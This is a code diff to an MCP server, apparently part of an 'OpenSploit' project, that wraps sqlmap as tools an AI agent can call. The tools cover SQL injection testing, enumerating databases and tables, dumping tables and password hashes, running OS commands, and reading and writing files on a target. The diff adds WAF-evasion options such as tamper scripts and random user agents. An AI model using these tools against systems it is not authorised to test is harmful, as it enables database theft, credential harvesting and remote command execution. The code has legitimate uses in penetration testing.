@@ -5,7 +5,6 @@ OpenSploit MCP Server: sqlmap
 Automatic SQL injection and database takeover tool.
 """
 
-import asyncio
 import json
 import os
 import re
@@ -24,6 +23,27 @@ class SqlmapServer(BaseMCPServer):
             description="Automatic SQL injection and database takeover tool",
             version="1.0.0",
         )
+
+        # Common optional params reused across methods
+        _common_params = {
+            "dbms": {
+                "type": "string",
+                "description": "Force DBMS type to skip detection. Values: 'MySQL', 'PostgreSQL', 'Oracle', 'Microsoft SQL Server', 'SQLite'. Speeds up exploitation when DBMS is known.",
+            },
+            "proxy": {
+                "type": "string",
+                "description": "HTTP/SOCKS proxy (e.g., 'http://127.0.0.1:8080', 'socks5://127.0.0.1:1080'). Use for scanning through tunnels or Burp interception.",
+            },
+            "random_agent": {
+                "type": "boolean",
+                "default": False,
+                "description": "Use a random HTTP User-Agent to avoid WAF detection. Sqlmap's default UA is commonly blocked.",
+            },
+            "headers": {
+                "type": "string",
+                "description": "Additional HTTP headers, semicolon-separated. Example: 'Authorization: Bearer eyJ...;X-Custom: value'.",
+            },
+        }
 
         self.register_method(
             name="test_injection",
@@ -57,6 +77,20 @@ class SqlmapServer(BaseMCPServer):
                     "default": "BEUSTQ",
                     "description": "SQL injection techniques: B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline",
                 },
+                "param": {
+                    "type": "string",
+                    "description": "Specific parameter to test (e.g., 'id'). Without this, sqlmap tests all parameters.",
+                },
+                "tamper": {
+                    "type": "string",
+                    "description": "Tamper script(s) for WAF bypass. Comma-separated. Common: 'space2comment', 'between', 'charencode', 'randomcase'.",
+                },
+                "flush_session": {
+                    "type": "boolean",
+                    "default": False,
+                    "description": "Clear cached session data and re-test from scratch.",
+                },
+                **_common_params,
                 "timeout": {
                     "type": "integer",
                     "default": 300,
@@ -83,6 +117,7 @@ class SqlmapServer(BaseMCPServer):
                     "type": "string",
                     "description": "HTTP cookie header value",
                 },
+                **_common_params,
                 "timeout": {
                     "type": "integer",
                     "default": 300,
@@ -90,6 +125,38 @@ class SqlmapServer(BaseMCPServer):
                 },
             },
             handler=self.enumerate_dbs,
+        )
+
+        self.register_method(
+            name="enumerate_tables",
+            description="List all tables in a database",
+            params={
+                "url": {
+                    "type": "string",
+                    "required": True,
+                    "description": "Target URL (previously confirmed vulnerable)",
+                },
+                "database": {
+                    "type": "string",
+                    "required": True,
+                    "description": "Database name from enumerate_dbs",
+                },
+                "data": {
+                    "type": "string",
+                    "description": "POST data if needed",
+                },
+                "cookie": {
+                    "type": "string",
+                    "description": "HTTP cookie header value",
+                },
+                **_common_params,
+                "timeout": {
+                    "type": "integer",
+                    "default": 300,
+                    "description": "Timeout in seconds",
+                },
+            },
+            handler=self.enumerate_tables,
         )
 
         self.register_method(
@@ -128,6 +195,7 @@ class SqlmapServer(BaseMCPServer):
                     "default": 100,
                     "description": "Maximum rows to dump",
                 },
+                **_common_params,
                 "timeout": {
                     "type": "integer",
                     "default": 600,
@@ -159,6 +227,7 @@ class SqlmapServer(BaseMCPServer):
                     "type": "string",
                     "description": "HTTP cookie header value",
                 },
+                **_common_params,
                 "timeout": {
                     "type": "integer",
                     "default": 900,
@@ -166,6 +235,33 @@ class SqlmapServer(BaseMCPServer):
                 },
             },
             handler=self.dump_all,
+        )
+
+        self.register_method(
+            name="dump_passwords",
+            description="Dump database user password hashes",
+            params={
+                "url": {
+                    "type": "string",
+                    "required": True,
+                    "description": "Target URL (previously confirmed vulnerable)",
+                },
+                "data": {
+                    "type": "string",
+                    "description": "POST data if needed",
+                },
+                "cookie": {
+                    "type": "string",
+                    "description": "HTTP cookie header value",
+                },
+                **_common_params,
+                "timeout": {
+                    "type": "integer",
+                    "default": 300,
+                    "description": "Timeout in seconds",
+                },
+            },
+            handler=self.dump_passwords,
         )
 
         self.register_method(
@@ -190,6 +286,8 @@ class SqlmapServer(BaseMCPServer):
                     "type": "string",
                     "description": "HTTP cookie header value",
                 },
+                "dbms": _common_params["dbms"],
+                "proxy": _common_params["proxy"],
                 "timeout": {
                     "type": "integer",
                     "default": 120,
@@ -221,6 +319,8 @@ class SqlmapServer(BaseMCPServer):
                     "type": "string",
                     "description": "HTTP cookie header value",
                 },
+                "dbms": _common_params["dbms"],
+                "proxy": _common_params["proxy"],
                 "timeout": {
                     "type": "integer",
                     "default": 120,
@@ -257,6 +357,8 @@ class SqlmapServer(BaseMCPServer):
                     "type": "string",
                     "description": "HTTP cookie header value",
                 },
+                "dbms": _common_params["dbms"],
+                "proxy": _common_params["proxy"],
                 "timeout": {
                     "type": "integer",
                     "default": 120,
@@ -265,6 +367,34 @@ class SqlmapServer(BaseMCPServer):
             },
             handler=self.file_write,
         )
+
+    @staticmethod
+    def _append_common_args(
+        args: list,
+        *,
+        data: Optional[str] = None,
+        cookie: Optional[str] = None,
+        dbms: Optional[str] = None,
+        proxy: Optional[str] = None,
+        random_agent: bool = False,
+        headers: Optional[str] = None,
+    ):
+        """Append common optional args to a sqlmap command."""
+        if data:
+            args.extend(["--data", data])
+        if cookie:
+            args.extend(["--cookie", cookie])
+        if dbms:
+            args.extend(["--dbms", dbms])
+        if proxy:
+            args.extend(["--proxy", proxy])
+        if random_agent:
+            args.append("--random-agent")
+        if headers:
+            for header in headers.replace(";", "\n").split("\n"):
+                header = header.strip()
+                if header:
+                    args.extend(["-H", header])
 
     def _parse_sqlmap_output(self, output: str) -> Dict[str, Any]:
         """Parse sqlmap output for injection results."""
@@ -375,6 +505,13 @@ class SqlmapServer(BaseMCPServer):
         level: int = 1,
         risk: int = 1,
         technique: str = "BEUSTQ",
+        param: Optional[str] = None,
+        tamper: Optional[str] = None,
+        flush_session: bool = False,
+        dbms: Optional[str] = None,
+        proxy: Optional[str] = None,
+        random_agent: bool = False,
+        headers: Optional[str] = None,
         timeout: int = 300,
     ) -> ToolResult:
         """Test a URL parameter for SQL injection vulnerabilities."""
@@ -390,11 +527,17 @@ class SqlmapServer(BaseMCPServer):
             "--threads", "4",
         ]
 
-        if data:
-            args.extend(["--data", data])
+        if param:
+            args.extend(["-p", param])
+        if tamper:
+            args.extend(["--tamper", tamper])
+        if flush_session:
+            args.append("--flush-session")
 
-        if cookie:
-            args.extend(["--cookie", cookie])
+        self._append_common_args(
+            args, data=data, cookie=cookie, dbms=dbms,
+            proxy=proxy, random_agent=random_agent, headers=headers,
+        )
 
         try:
             self.logger.info(f"Running: {' '.join(args)}")
@@ -428,6 +571,10 @@ class SqlmapServer(BaseMCPServer):
         url: str,
         data: Optional[str] = None,
         cookie: Optional[str] = None,
+        dbms: Optional[str] = None,
+        proxy: Optional[str] = None,
+        random_agent: bool = False,
+        headers: Optional[str] = None,
         timeout: int = 300,
     ) -> ToolResult:
         """Enumerate databases on a confirmed vulnerable target."""
@@ -441,11 +588,10 @@ class SqlmapServer(BaseMCPServer):
             "--threads", "4",
         ]
 
-        if data:
-            args.extend(["--data", data])
-
-        if cookie:
-            args.extend(["--cookie", cookie])
+        self._append_common_args(
+            args, data=data, cookie=cookie, dbms=dbms,
+            proxy=proxy, random_agent=random_agent, headers=headers,
+        )
 
         try:
             self.logger.info(f"Running: {' '.join(args)}")
@@ -471,6 +617,72 @@ class SqlmapServer(BaseMCPServer):
                 error=str(e),
             )
 
+    async def enumerate_tables(
+        self,
+        url: str,
+        database: str,
+        data: Optional[str] = None,
+        cookie: Optional[str] = None,
+        dbms: Optional[str] = None,
+        proxy: Optional[str] = None,
+        random_agent: bool = False,
+        headers: Optional[str] = None,
+        timeout: int = 300,
+    ) -> ToolResult:
+        """List all tables in a database."""
+        self.logger.info(f"Enumerating tables in {database} on {url}")
+
+        args = [
+            "sqlmap",
+            "-u", url,
+            "--batch",
+            "-D", database,
+            "--tables",
+            "--threads", "4",
+        ]
+
+        self._append_common_args(
+            args, data=data, cookie=cookie, dbms=dbms,
+            proxy=proxy, random_agent=random_agent, headers=headers,
+        )
+
+        try:
+            result = await self.run_command(args, timeout=timeout)
+            output = result.stdout + result.stderr
+
+            # Parse table names from output
+            tables = []
+            in_table_section = False
+            for line in output.split("\n"):
+                if "Database:" in line and database in line:
+                    in_table_section = True
+                    continue
+                if in_table_section:
+                    line_s = line.strip()
+                    if line_s.startswith("[") and "tables" in line_s:
+                        continue
+                    if line_s.startswith("+") or line_s.startswith("-"):
+                        continue
+                    if line_s.startswith("|"):
+                        table = line_s.strip("|").strip()
+                        if table:
+                            tables.append(table)
+                    elif line_s == "" and tables:
+                        break
+
+            return ToolResult(
+                success=True,
+                data={
+                    "database": database,
+                    "tables": tables,
+                    "count": len(tables),
+                    "target": url,
+                },
+                raw_output=sanitize_output(output),
+            )
+        except ToolError as e:
+            return ToolResult(success=False, data={}, error=str(e))
+
     async def dump_table(
         self,
         url: str,
@@ -480,6 +692,10 @@ class SqlmapServer(BaseMCPServer):
         data: Optional[str] = None,
         cookie: Optional[str] = None,
         limit: int = 100,
+        dbms: Optional[str] = None,
+        proxy: Optional[str] = None,
+        random_agent: bool = False,
+        headers: Optional[str] = None,
         timeout: int = 600,
     ) -> ToolResult:
         """Dump contents of a database table."""
@@ -499,14 +715,13 @@ class SqlmapServer(BaseMCPServer):
         if columns:
             args.extend(["-C", columns])
 
-        if data:
-            args.extend(["--data", data])
-
-        if cookie:
-            args.extend(["--cookie", cookie])
-
         if limit:
             args.extend(["--stop", str(limit)])
+
+        self._append_common_args(
+            args, data=data, cookie=cookie, dbms=dbms,
+            proxy=proxy, random_agent=random_agent, headers=headers,
+        )
 
         try:
             self.logger.info(f"Running: {' '.join(args)}")
@@ -538,6 +753,10 @@ class SqlmapServer(BaseMCPServer):
         database: str,
         data: Optional[str] = None,
         cookie: Optional[str] = None,
+        dbms: Optional[str] = None,
+        proxy: Optional[str] = None,
+        random_agent: bool = False,
+        headers: Optional[str] = None,
         timeout: int = 900,
     ) -> ToolResult:
         """Dump all tables from a database."""
@@ -552,11 +771,10 @@ class SqlmapServer(BaseMCPServer):
             "--threads", "4",
         ]
 
-        if data:
-            args.extend(["--data", data])
-
-        if cookie:
-            args.extend(["--cookie", cookie])
+        self._append_common_args(
+            args, data=data, cookie=cookie, dbms=dbms,
+            proxy=proxy, random_agent=random_agent, headers=headers,
+        )
 
         try:
             self.logger.info(f"Running: {' '.join(args)}")
@@ -581,12 +799,74 @@ class SqlmapServer(BaseMCPServer):
                 error=str(e),
             )
 
+    async def dump_passwords(
+        self,
+        url: str,
+        data: Optional[str] = None,
+        cookie: Optional[str] = None,
+        dbms: Optional[str] = None,
+        proxy: Optional[str] = None,
+        random_agent: bool = False,
+        headers: Optional[str] = None,
+        timeout: int = 300,
+    ) -> ToolResult:
+        """Dump database user password hashes."""
+        self.logger.info(f"Dumping password hashes from {url}")
+
+        args = [
+            "sqlmap",
+            "-u", url,
+            "--batch",
+            "--passwords",
+            "--threads", "4",
+        ]
+
+        self._append_common_args(
+            args, data=data, cookie=cookie, dbms=dbms,
+            proxy=proxy, random_agent=random_agent, headers=headers,
+        )
+
+        try:
+            result = await self.run_command(args, timeout=timeout)
+            output = result.stdout + result.stderr
+
+            # Parse password hash output
+            hashes = []
+            current_user = None
+            for line in output.split("\n"):
+                if "database management system users password hashes" in line.lower():
+                    continue
+                user_match = re.match(r"\[\*\]\s+(\S+)", line)
+                if user_match:
+                    current_user = user_match.group(1)
+                    continue
+                hash_match = re.match(r"\s+password hash:\s+(.+)", line)
+                if hash_match and current_user:
+                    hashes.append({
+                        "user": current_user,
+                        "hash": hash_match.group(1).strip(),
+                    })
+
+            return ToolResult(
+                success=True,
+                data={
+                    "hashes": hashes,
+                    "count": len(hashes),
+                    "target": url,
+                },
+                raw_output=sanitize_output(output),
+            )
+        except ToolError as e:
+            return ToolResult(success=False, data={}, error=str(e))
+
     async def os_shell(
         self,
         url: str,
         command: str,
         data: Optional[str] = None,
         cookie: Optional[str] = None,
+        dbms: Optional[str] = None,
+        proxy: Optional[str] = None,
         timeout: int = 120,
     ) -> ToolResult:
         """Execute an OS command via SQL injection."""
@@ -599,11 +879,9 @@ class SqlmapServer(BaseMCPServer):
             "--os-cmd", command,
         ]
 
-        if data:
-            args.extend(["--data", data])
-
-        if cookie:
-            args.extend(["--cookie", cookie])
+        self._append_common_args(
+            args, data=data, cookie=cookie, dbms=dbms, proxy=proxy,
+        )
 
         try:
             self.logger.info(f"Running: {' '.join(args)}")
@@ -647,6 +925,8 @@ class SqlmapServer(BaseMCPServer):
         file_path: str,
         data: Optional[str] = None,
         cookie: Optional[str] = None,
+        dbms: Optional[str] = None,
+        proxy: Optional[str] = None,
         timeout: int = 120,
     ) -> ToolResult:
         """Read a file from the target server."""
@@ -659,11 +939,9 @@ class SqlmapServer(BaseMCPServer):
             "--file-read", file_path,
         ]
 
-        if data:
-            args.extend(["--data", data])
-
-        if cookie:
-            args.extend(["--cookie", cookie])
+        self._append_common_args(
+            args, data=data, cookie=cookie, dbms=dbms, proxy=proxy,
+        )
 
         try:
             self.logger.info(f"Running: {' '.join(args)}")
@@ -682,7 +960,7 @@ class SqlmapServer(BaseMCPServer):
                         try:
                             with open(local_path, 'r') as f:
                                 file_content = f.read()
-                        except:
+                        except Exception:
                             file_content = f"File saved to: {local_path}"
 
             return ToolResult(
@@ -709,6 +987,8 @@ class SqlmapServer(BaseMCPServer):
         remote_path: str,
         data: Optional[str] = None,
         cookie: Optional[str] = None,
+        dbms: Optional[str] = None,
+        proxy: Optional[str] = None,
         timeout: int = 120,
     ) -> ToolResult:
         """Write a file to the target server."""
@@ -728,11 +1008,9 @@ class SqlmapServer(BaseMCPServer):
             "--file-dest", remote_path,
         ]
 
-        if data:
-            args.extend(["--data", data])
-
-        if cookie:
-            args.extend(["--cookie", cookie])
+        self._append_common_args(
+            args, data=data, cookie=cookie, dbms=dbms, proxy=proxy,
+        )
 
         try:
             self.logger.info(f"Running: {' '.join(args)}")
